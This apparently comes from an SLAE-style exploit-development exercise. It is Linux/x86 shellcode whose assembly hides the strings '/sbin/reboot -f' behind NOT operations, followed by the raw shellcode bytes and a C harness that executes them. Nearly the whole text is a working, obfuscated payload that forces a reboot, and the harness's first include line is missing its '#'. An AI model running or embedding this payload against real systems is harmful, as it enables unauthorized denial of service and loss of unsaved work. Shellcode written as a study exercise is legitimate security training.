#---------------------- DESCRIPTION -------------------------------------#

; Title: [NOT encoded] Linux/x86 Force Reboot shellcode for Linux/x86 - Polymorphic
; Author: Daniel Ortiz
; Tested on: Linux 4.18.0-25-generic #26 Ubuntu
; Size: 51 bytes
; SLAE ID: PA-9844


#---------------------- ASM CODE ------------------------------------------#


SECTION .data

         SYSCALL_EXECVE equ 11

SECTION .text

global _start

_start:
        nop
        or eax, 0xffffffff
        not eax
        push eax


        mov eax, 0x8b90909d
        not eax
        push eax

        mov eax, 0x9a8dd091
        not eax
        push eax

        mov eax, 0x969d8cd0
        not eax
        push eax

        xor eax, eax
        mov ebx, esp
        push eax
        push word  0x662d
        mov  esi, esp
        push eax
        push esi
        push ebx
        mov  ecx, esp
        or   al, SYSCALL_EXECVE
        int  0x80


#------------------------- final shellcode ----------------------------------------#

unsigned char buf[] =

"\x90\x83\xc8\xff\xf7\xd0\x50\xb8\x9d\x90\x90\x8b\xf7\xd0\x50"
"\xb8\x91\xd0\x8d\x9a\xf7\xd0\x50\xb8\xd0\x8c\x9d\x96\xf7\xd0"
"\x50\x31\xc0\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\x0c\x0b\xcd\x80";




#------------------------- usage --------------------------------------------------#

include <stdio.h>
#include <string.h>

char *shellcode =

"\x90\x83\xc8\xff\xf7\xd0\x50\xb8\x9d\x90\x90\x8b\xf7\xd0\x50\xb8\x91\xd0\x8d\x9a\xf7\xd0\x50\xb8\xd0\x8c\x9d\x96\xf7\xd0\x50\x31\xc0\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\x0c\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}